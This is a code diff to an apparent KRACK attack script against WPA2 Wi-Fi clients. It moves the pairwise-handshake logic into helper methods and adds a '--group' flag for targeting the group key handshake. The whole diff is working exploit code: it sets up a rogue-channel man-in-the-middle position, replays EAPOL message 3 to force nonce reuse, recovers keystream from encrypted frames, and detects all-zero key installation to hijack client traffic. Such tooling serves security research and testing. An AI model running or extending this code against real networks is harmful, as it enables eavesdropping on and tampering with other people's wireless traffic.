@@ -397,11 +397,17 @@ class ClientState():
 
 	# TODO: Also forward when attack has failed?
 	def should_forward(self, p):
-		if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
-			# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
-			return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
-				or (p.type == 0 and p.subtype == 13)
-		return self.state in [ClientState.Success_Reinstalled]
+		if args.group:
+			# Forwarding rules when attacking the group handshake
+			return True
+
+		else:
+			# Forwarding rules when attacking the 4-way handshake
+			if self.state in [ClientState.Connecting, ClientState.GotMitm, ClientState.Attack_Started]:
+				# Also forward Action frames (e.g. Broadcom AP waits for ADDBA Request/Response before starting 4-way HS).
+				return Dot11Auth in p or Dot11AssoReq in p or Dot11AssoResp in p or (1 <= get_eapol_msgnum(p) and get_eapol_msgnum(p) <= 3) \
+					or (p.type == 0 and p.subtype == 13)
+			return self.state in [ClientState.Success_Reinstalled]
 
 	def save_iv_keystream(self, iv, keystream):
 		self.keystreams[iv] = keystream
@@ -521,6 +527,66 @@ class KRAckAttack():
 
 		return True
 
+	def handle_toclient_pairwise(self, client, p):
+		if args.group: return False
+
+		eapolnum = get_eapol_msgnum(p)
+		if eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
+			client.add_if_new_msg3(p)
+			# FIXME: This may cause a timeout on the client side???
+			if len(client.msg3s) >= 2:
+				log(STATUS, "Got 2nd unique EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
+				for p in client.msg3s: self.sock_rogue.send(p)
+				client.msg3s = []
+				# TODO: Should extra stuff be done here? Forward msg4 to real AP?
+				client.attack_start()
+			else:
+				log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
+
+			return True
+
+		return False
+
+	def handle_from_client_pairwise(self, client, p):
+		if args.group: return False
+
+		# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
+		plaintext = "\xaa\xaa\x03\x00\x00\x00"
+		encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
+		keystream = xorstr(plaintext, encrypted)
+
+		iv = dot11_get_iv(p)
+		if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
+
+		# FIXME:
+		# - The reused IV could be one we accidently missed due to high traffic!!!
+		# - It could be a retransmitted packet
+		if client.is_iv_reused(iv):
+			# If the same keystream is reused, we have a normal key reinstallation attack
+			if keystream == client.get_keystream(iv):
+				log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
+				client.update_state(ClientState.Success_Reinstalled)
+
+				# TODO: Confirm that the handshake now indeed completes. FIXME: Only if we have a msg4?
+				self.sock_real.send(client.msg4)
+
+			# Otherwise the client likely installed a new key, i.e., probably an all-zero key
+			else:
+				log(STATUS, "SUCCESS! Nonce reuse (IV=%d), with likely use of all-zero key." % iv, color="green", showtime=False)
+				log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
+
+				self.hostapd_add_allzero_client(client)
+
+				# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
+				client.update_state(ClientState.Success_AllzeroKey)
+
+		elif client.attack_timeout(iv):
+			log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
+			client.update_state(ClientState.Failed)
+
+		client.save_iv_keystream(iv, keystream)
+
+
 	def handle_rx_realchan(self):
 		p = self.sock_real.recv()
 		if p == None: return
@@ -590,18 +656,8 @@ class KRAckAttack():
 				client = self.clients[p.addr1]
 
 				# Note: could be that client only switching to rogue channel before receiving Msg3 and sending Msg4
-				eapolnum = get_eapol_msgnum(p)
-				if eapolnum == 3 and client.state in [ClientState.Connecting, ClientState.GotMitm]:
-					client.add_if_new_msg3(p)
-					# FIXME: This may cause a timeout on the client side???
-					if len(client.msg3s) >= 2:
-						log(STATUS, "Got 2nd unique EAPOL msg3, will now forward both msg3's", color="green", showtime=False)
-						for p in client.msg3s: self.sock_rogue.send(p)
-						client.msg3s = []
-						# TODO: Should extra stuff be done here? Forward msg4 to real AP?
-						client.attack_start()
-					else:
-						log(STATUS, "Not forwarding EAPOL msg3 (%d unique now queued)" % len(client.msg3s), color="green", showtime=False)
+				if self.handle_toclient_pairwise(client, p):
+					pass
 
 				elif Dot11Deauth in p:
 					del self.clients[p.addr1]
@@ -661,43 +717,9 @@ class KRAckAttack():
 				# Client is sending on rogue channel, we got a MitM position =)
 				client.mark_got_mitm()
 
-				# Use encrypted frames to determine if the key reinstallation attack succeeded
 				if Dot11WEP in p:
-					# Note that scapy incorrectly puts Extended IV into wepdata field, so skip those four bytes				
-					plaintext = "\xaa\xaa\x03\x00\x00\x00"
-					encrypted = p[Dot11WEP].wepdata[4:4+len(plaintext)]
-					keystream = xorstr(plaintext, encrypted)
-
-					iv = dot11_get_iv(p)
-					if iv <= 1: log(DEBUG, "Ciphertext: " + encrypted.encode("hex"), showtime=False)
-
-					# FIXME:
-					# - The reused IV could be one we accidently missed due to high traffic!!!
-					# - It could be a retransmitted packet
-					if client.is_iv_reused(iv):
-						# If the same keystream is reused, we have a normal key reinstallation attack
-						if keystream == client.get_keystream(iv):
-							log(STATUS, "SUCCESS! Nonce and keystream reuse detected (IV=%d)." % iv, color="green", showtime=False)
-							client.update_state(ClientState.Success_Reinstalled)
-	
-							# TODO: Confirm that the handshake now indeed completes. FIXME: Only if we have a msg4?
-							self.sock_real.send(client.msg4)
-
-						# Otherwise the client likely installed a new key, i.e., probably an all-zero key
-						else:
-							log(STATUS, "SUCCESS! Nonce reuse (IV=%d), with likely use of all-zero key." % iv, color="green", showtime=False)
-							log(STATUS, "Now directly MitM'ing using rogue AP ...", color="green", showtime=False)
-
-							self.hostapd_add_allzero_client(client)
-
-							# The client is now no longer MitM'ed by this script (i.e. no frames forwarded between channels)
-							client.update_state(ClientState.Success_AllzeroKey)
-
-					elif client.attack_timeout(iv):
-						log(WARNING, "KRAck Attack against %s seems to have failed" % client.macaddr)
-						client.update_state(ClientState.Failed)
-
-					client.save_iv_keystream(iv, keystream)
+					# Use encrypted frames to determine if the key reinstallation attack succeeded
+					self.handle_from_client_pairwise(client, p)
 
 
 				if will_forward:
@@ -895,6 +917,8 @@ if __name__ == "__main__":
 	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
 	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
 	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 every second)", action='store_true')
+	parser.add_argument("--group", help="Perform attacks on the group key handshake only", action='store_true')
+
 	args = parser.parse_args()
 
 	global_log_level = max(ALL, global_log_level - args.debug)
